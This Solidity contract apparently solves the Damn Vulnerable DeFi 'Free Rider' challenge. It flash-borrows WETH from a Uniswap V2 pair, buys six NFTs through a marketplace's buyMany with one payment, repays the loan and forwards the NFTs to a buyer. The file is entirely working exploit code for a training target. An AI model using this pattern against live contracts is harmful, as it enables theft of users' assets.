// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Pair {
    // token0 : weth
    // token1 : DTV
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH9 {
    function balanceOf(address) external returns (uint);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract FlashLoanFreeRider {

    address uniswapPair;
    IWETH9 weth;
    address nftMarketplace;
    address damnNft;
    address buyer;

    uint256[] public tokenIds = [0,1,2,3,4,5];

    constructor(address _uniswapPair, address _weth, address _nftMarketplace, address _damnNft, address _buyer) {
        uniswapPair = _uniswapPair;
        weth = IWETH9(_weth);
        nftMarketplace = _nftMarketplace;
        damnNft = _damnNft;
        buyer = _buyer;
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        weth.withdraw(amount0); // convert weth to eth

        IFreeRiderNFTMarketplace(nftMarketplace).buyMany{value: address(this).balance}(tokenIds);

        weth.deposit{value: address(this).balance}(); // convert eth to weth
        weth.transfer(uniswapPair, weth.balanceOf(address(this)));  // Pay back to FlashLoan

        // Send NFT tokens to buyer
        for(uint256 i=0 ; i<tokenIds.length ; i++) {
            IERC721(damnNft).safeTransferFrom(address(this), buyer, i);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {  
        return IERC721Receiver.onERC721Received.selector;
    }

    function exploit(uint256 _flashLoanAmount) external {
        bytes memory data = "data"; // cant be empty
        IUniswapV2Pair(uniswapPair).swap(_flashLoanAmount, 0, address(this), data);
    }

    receive() external payable {}
}